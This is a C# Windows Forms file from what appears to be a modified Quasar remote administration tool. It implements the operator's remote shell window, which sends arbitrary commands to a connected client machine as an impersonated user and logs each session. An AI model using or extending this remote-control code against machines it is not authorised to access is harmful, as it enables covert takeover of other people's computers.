using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmShellImpersonate : Form, IRemoteShell
    {
        //Need to generate a Form Closing.
        private readonly Client _connectClient;
        private readonly string _impersonatedUser;
        public FrmShellImpersonate(Client c, string impersonatedUser)
        {
            _connectClient = c;
            _impersonatedUser = impersonatedUser;
            //Looks like UserState might be able to be used to keep track of the agent.
            //Add a new Frm in UserState.cs to be able to reference back to this form at any time.
            _connectClient.Value.FrmIm = this;

            InitializeComponent();
            QuasarServer.writeLog("Beginning Remote Shell Session.", c.Value.PCName);
            txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
        }

        public void PrintError(string errorMessage)
        {
            try
            {
                txtConsole.Invoke((MethodInvoker)delegate
                {
                    txtConsole.SelectionColor = Color.Red;
                    QuasarServer.writeLog(errorMessage, _connectClient.Value.PCName);
                    txtConsole.AppendText(errorMessage + "\r\n");
                });
                return;
            }
            catch (InvalidOperationException)
            {
                return;
            }
        }

        public void PrintMessage(string message)
        {
            try
            {
                txtConsole.Invoke((MethodInvoker)delegate
                {
                    txtConsole.SelectionColor = Color.WhiteSmoke;
                    QuasarServer.writeLog(message, _connectClient.Value.PCName);
                    txtConsole.AppendText(message + "\r\n");
                });
                return;
            }
            catch (InvalidOperationException)
            {
                return;
            }
        }

        private void FrmShellImpersonate_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;

            if (_connectClient != null)
                this.Text = WindowHelper.GetWindowTitle("Remote Shell", _connectClient);
        }

        private void FrmShellImpersonate_FormClosing(object sender, FormClosingEventArgs e)
        {
            new Core.Packets.ServerPackets.DoShellExecute("exit", true, _impersonatedUser).Execute(_connectClient);
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRs = null;
        }

        private void txtInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtInput.Text.Trim()))
            {
                string input = txtInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                txtConsole.AppendText(">>" + txtInput.Text +"\r\n");
                txtInput.Text = string.Empty;

                // Split based on the space key.
                string[] splitSpaceInput = input.Split(' ');
                // Split based on the null key.
                string[] splitNullInput = input.Split(' ');

                // We have an exit command.
                if (input == "exit" ||
                    ((splitSpaceInput.Length > 0) && splitSpaceInput[0] == "exit") ||
                    ((splitNullInput.Length > 0) && splitNullInput[0] == "exit"))
                {
                    QuasarServer.writeLog("Ending Shell Session", _connectClient.Value.PCName);
                    this.Close();
                }
                else
                {
                    switch (input)
                    {
                        case "cls":
                            txtConsole.Text = string.Empty;
                            break;
                        default:
                            System.IO.File.AppendAllText(@"C:\Quasar\log.txt", "Sending Shell Command \r\n");
                            new Core.Packets.ServerPackets.DoShellExecute(input, true, _impersonatedUser).Execute(_connectClient);
                            break;
                    }
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }
    }
}
